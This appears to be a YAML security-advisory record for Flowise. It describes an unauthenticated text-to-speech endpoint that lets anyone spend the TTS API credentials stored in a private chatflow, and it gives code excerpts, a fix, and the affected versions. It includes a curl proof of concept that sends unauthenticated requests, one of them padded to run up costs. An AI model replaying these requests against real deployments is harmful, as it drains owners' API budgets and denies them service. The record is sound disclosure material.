@@ -1,0 +1,216 @@
+advisory_id: GHSA-8gj2-2cvc-6xx7
+datasource_id: github_osv/GHSA-8gj2-2cvc-6xx7
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-8gj2-2cvc-6xx7/GHSA-8gj2-2cvc-6xx7.json
+aliases: []
+summary: "Flowise: Unauthenticated Credential Abuse via Text-to-Speech Endpoint Allows Unauthorized\
+  \ Use of Private Chatflow TTS Credentials\n## Summary\n\nThe `/api/v1/text-to-speech/generate`\
+  \ endpoint is whitelisted (requires no authentication) and accepts any `chatflowId` without\
+  \ checking whether the referenced chatflow is public. An unauthenticated attacker who knows\
+  \ a valid chatflow UUID can abuse that chatflow's TTS credential (OpenAI or ElevenLabs API\
+  \ key) to generate unlimited text-to-speech audio, incurring costs on the chatflow owner's\
+  \ account.\n\n## Details\n\nThe TTS `generateTextToSpeech` controller at `packages/server/src/controllers/text-to-speech/index.ts:10-171`\
+  \ is whitelisted at `packages/server/src/utils/constants.ts:41`:\n\n```typescript\n'/api/v1/text-to-speech/generate',\n\
+  ```\n\nWhen a `chatflowId` is provided and the user is not authenticated (no `req.user`),\
+  \ the controller falls back to fetching the chatflow without workspace scoping:\n\n```typescript\n\
+  // packages/server/src/controllers/text-to-speech/index.ts:36-42\nif (workspaceId) {\n   \
+  \ chatflow = await chatflowsService.getChatflowById(chatflowId, workspaceId)\n} else {\n \
+  \   // Fallback: get workspaceId from chatflow when req.user.activeWorkspaceId is not set\n\
+  \    chatflow = await chatflowsService.getChatflowById(chatflowId)  // NO isPublic check\n\
+  \    workspaceId = chatflow.workspaceId\n}\n```\n\nThe `getChatflowById` function at `packages/server/src/services/chatflows/index.ts:247-272`\
+  \ fetches any chatflow by ID when `workspaceId` is not provided:\n\n```typescript\nconst dbResponse\
+  \ = await appServer.AppDataSource.getRepository(ChatFlow).findOne({\n    where: {\n      \
+  \  id: chatflowId,\n        ...(workspaceId ? { workspaceId } : {})  // No workspace filter\
+  \ when workspaceId is undefined\n    }\n})\n```\n\nThe controller then extracts the TTS provider\
+  \ configuration from the chatflow:\n\n```typescript\n// packages/server/src/controllers/text-to-speech/index.ts:51-66\n\
+  const ttsConfig = JSON.parse(chatflow.textToSpeech)\nconst activeProviderKey = Object.keys(ttsConfig).find(key\
+  \ => ttsConfig[key].status === true)\nconst providerConfig = ttsConfig[activeProviderKey]\n\
+  provider = activeProviderKey\ncredentialId = providerConfig.credentialId  // Extracted from\
+  \ private chatflow\n```\n\nThis `credentialId` is then used to decrypt and use the stored\
+  \ credential (OpenAI or ElevenLabs API key) to make TTS API calls at `packages/components/src/textToSpeech.ts:33-34`:\n\
+  \n```typescript\nconst credentialId = textToSpeechConfig.credentialId as string\nconst credentialData\
+  \ = await getCredentialData(credentialId ?? '', options)\n```\n\n## PoC\n\n```bash\n# Step\
+  \ 1: Know a chatflow UUID that has TTS enabled (any chatflow, public or private)\nCHATFLOW_ID=\"\
+  <any-chatflow-uuid-with-tts-enabled>\"\n\n# Step 2: Abuse the TTS credential to generate audio\
+  \ without authentication\ncurl -X POST \"http://localhost:3000/api/v1/text-to-speech/generate\"\
+  \ \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"chatflowId\": \"'${CHATFLOW_ID}'\"\
+  ,\n    \"chatId\": \"attacker-chat-1\",\n    \"chatMessageId\": \"msg-1\",\n    \"text\":\
+  \ \"This is a test of unauthorized TTS generation using someone elses API key\"\n  }'\n\n\
+  # Expected: Returns SSE stream with TTS audio data using the chatflow owner's OpenAI/ElevenLabs\
+  \ credentials\n# event: tts_start\n# data: {\"event\":\"tts_start\",\"data\":{\"chatMessageId\"\
+  :\"msg-1\",\"format\":\"mp3\"}}\n# event: tts_data\n# data: {\"event\":\"tts_data\",\"data\"\
+  :{\"chatMessageId\":\"msg-1\",\"audioChunk\":\"<base64-audio>\"}}\n\n# Step 3: Repeat with\
+  \ large text to incur costs\ncurl -X POST \"http://localhost:3000/api/v1/text-to-speech/generate\"\
+  \ \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"chatflowId\": \"'${CHATFLOW_ID}'\"\
+  ,\n    \"chatId\": \"attacker-chat-2\",\n    \"chatMessageId\": \"msg-2\",\n    \"text\":\
+  \ \"'$(python3 -c \"print('A' * 4096)\")'\"\n  }'\n```\n\n## Impact\n\n- **Financial Impact**:\
+  \ An attacker can generate unlimited TTS audio using the chatflow owner's OpenAI or ElevenLabs\
+  \ API credentials, incurring potentially significant costs. OpenAI TTS costs ~$15/1M characters;\
+  \ an attacker could generate large volumes of audio.\n- **Credential Abuse**: The attacker\
+  \ effectively gains indirect access to the stored API credentials without needing to authenticate\
+  \ or have any permissions. The credentials are not directly exposed but are used on behalf\
+  \ of the attacker.\n- **Denial of Service**: By exhausting the API quota/budget of the credential,\
+  \ the attacker can deny service to legitimate users of the chatflow.\n- **Affects Private\
+  \ Chatflows**: This vulnerability affects all chatflows with TTS configured, including those\
+  \ explicitly marked as private (`isPublic: false`).\n\n## Recommended Fix\n\n1. Check `isPublic`\
+  \ before allowing unauthenticated TTS generation:\n\n```typescript\n// packages/server/src/controllers/text-to-speech/index.ts\n\
+  if (chatflowId) {\n    let chatflow;\n    let workspaceId = req.user?.activeWorkspaceId;\n\
+  \    \n    if (workspaceId) {\n        chatflow = await chatflowsService.getChatflowById(chatflowId,\
+  \ workspaceId)\n    } else {\n        chatflow = await chatflowsService.getChatflowById(chatflowId)\n\
+  \        // Verify the chatflow is public before using its credentials\n        if (!chatflow.isPublic)\
+  \ {\n            throw new InternalFlowiseError(\n                StatusCodes.UNAUTHORIZED,\n\
+  \                'TTS generation requires authentication for non-public chatflows'\n     \
+  \       )\n        }\n        workspaceId = chatflow.workspaceId\n    }\n    // ... rest of\
+  \ the function\n}\n```\n\n2. Consider applying rate limiting to the TTS endpoint to prevent\
+  \ abuse even for public chatflows."
+impacted_packages:
+  - purl: pkg:github/flowiseai/flowise
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/flowiseai/flowise
+        commit: dbec8f9fd3c42faab49416fe81ff1774a5344cba
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:npm/flowise
+    affected_versions: vers:npm/<=3.1.3
+    fixed_versions: vers:npm/3.1.4
+    affected_packages:
+      - pkg:npm/flowise@1.0.0
+      - pkg:npm/flowise@1.0.1
+      - pkg:npm/flowise@1.1.0
+      - pkg:npm/flowise@1.1.1
+      - pkg:npm/flowise@1.2.1
+      - pkg:npm/flowise@1.2.2
+      - pkg:npm/flowise@1.2.3
+      - pkg:npm/flowise@1.2.4
+      - pkg:npm/flowise@1.2.5
+      - pkg:npm/flowise@1.2.6
+      - pkg:npm/flowise@1.2.7
+      - pkg:npm/flowise@1.2.8
+      - pkg:npm/flowise@1.2.9
+      - pkg:npm/flowise@1.2.10
+      - pkg:npm/flowise@1.2.11
+      - pkg:npm/flowise@1.2.12
+      - pkg:npm/flowise@1.2.13
+      - pkg:npm/flowise@1.2.14
+      - pkg:npm/flowise@1.2.15
+      - pkg:npm/flowise@1.2.16
+      - pkg:npm/flowise@1.3.0
+      - pkg:npm/flowise@1.3.1
+      - pkg:npm/flowise@1.3.2
+      - pkg:npm/flowise@1.3.3
+      - pkg:npm/flowise@1.3.4
+      - pkg:npm/flowise@1.3.5
+      - pkg:npm/flowise@1.3.6
+      - pkg:npm/flowise@1.3.7
+      - pkg:npm/flowise@1.3.8-rc.1
+      - pkg:npm/flowise@1.3.8
+      - pkg:npm/flowise@1.3.9
+      - pkg:npm/flowise@1.4.0-rc.1
+      - pkg:npm/flowise@1.4.0
+      - pkg:npm/flowise@1.4.1
+      - pkg:npm/flowise@1.4.2
+      - pkg:npm/flowise@1.4.3
+      - pkg:npm/flowise@1.4.4
+      - pkg:npm/flowise@1.4.5
+      - pkg:npm/flowise@1.4.6
+      - pkg:npm/flowise@1.4.7
+      - pkg:npm/flowise@1.4.8
+      - pkg:npm/flowise@1.4.9
+      - pkg:npm/flowise@1.4.10
+      - pkg:npm/flowise@1.4.11
+      - pkg:npm/flowise@1.4.12
+      - pkg:npm/flowise@1.5.0
+      - pkg:npm/flowise@1.5.1
+      - pkg:npm/flowise@1.6.0
+      - pkg:npm/flowise@1.6.1
+      - pkg:npm/flowise@1.6.2
+      - pkg:npm/flowise@1.6.3
+      - pkg:npm/flowise@1.6.4
+      - pkg:npm/flowise@1.6.5
+      - pkg:npm/flowise@1.6.6
+      - pkg:npm/flowise@1.7.1
+      - pkg:npm/flowise@1.7.2
+      - pkg:npm/flowise@1.8.0
+      - pkg:npm/flowise@1.8.1
+      - pkg:npm/flowise@1.8.2
+      - pkg:npm/flowise@1.8.3
+      - pkg:npm/flowise@1.8.4
+      - pkg:npm/flowise@2.0.0
+      - pkg:npm/flowise@2.0.1
+      - pkg:npm/flowise@2.0.2
+      - pkg:npm/flowise@2.0.3
+      - pkg:npm/flowise@2.0.4
+      - pkg:npm/flowise@2.0.5
+      - pkg:npm/flowise@2.0.6
+      - pkg:npm/flowise@2.0.7
+      - pkg:npm/flowise@2.1.0
+      - pkg:npm/flowise@2.1.1
+      - pkg:npm/flowise@2.1.2
+      - pkg:npm/flowise@2.1.3
+      - pkg:npm/flowise@2.1.4
+      - pkg:npm/flowise@2.1.5
+      - pkg:npm/flowise@2.2.0
+      - pkg:npm/flowise@2.2.1
+      - pkg:npm/flowise@2.2.2
+      - pkg:npm/flowise@2.2.3
+      - pkg:npm/flowise@2.2.4
+      - pkg:npm/flowise@2.2.5
+      - pkg:npm/flowise@2.2.6-hotfix.1
+      - pkg:npm/flowise@2.2.6
+      - pkg:npm/flowise@2.2.7-patch.1
+      - pkg:npm/flowise@2.2.7
+      - pkg:npm/flowise@2.2.8
+      - pkg:npm/flowise@3.0.0
+      - pkg:npm/flowise@3.0.1
+      - pkg:npm/flowise@3.0.2
+      - pkg:npm/flowise@3.0.3
+      - pkg:npm/flowise@3.0.4
+      - pkg:npm/flowise@3.0.5
+      - pkg:npm/flowise@3.0.6
+      - pkg:npm/flowise@3.0.7
+      - pkg:npm/flowise@3.0.8
+      - pkg:npm/flowise@3.0.10
+      - pkg:npm/flowise@3.0.11
+      - pkg:npm/flowise@3.0.12
+      - pkg:npm/flowise@3.0.13
+      - pkg:npm/flowise@3.1.0
+      - pkg:npm/flowise@3.1.1
+      - pkg:npm/flowise@3.1.2
+      - pkg:npm/flowise@3.1.3
+    fixed_packages:
+      - pkg:npm/flowise@3.1.4
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '6.3'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-8gj2-2cvc-6xx7/GHSA-8gj2-2cvc-6xx7.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-862
+references:
+  - url: https://github.com/FlowiseAI/Flowise
+    reference_type:
+    reference_id:
+  - url: https://github.com/FlowiseAI/Flowise/commit/dbec8f9fd3c42faab49416fe81ff1774a5344cba
+    reference_type:
+    reference_id:
+  - url: https://github.com/FlowiseAI/Flowise/pull/6650
+    reference_type:
+    reference_id:
+  - url: https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.4
+    reference_type:
+    reference_id:
+  - url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-8gj2-2cvc-6xx7
+    reference_type:
+    reference_id:
+exploits: []
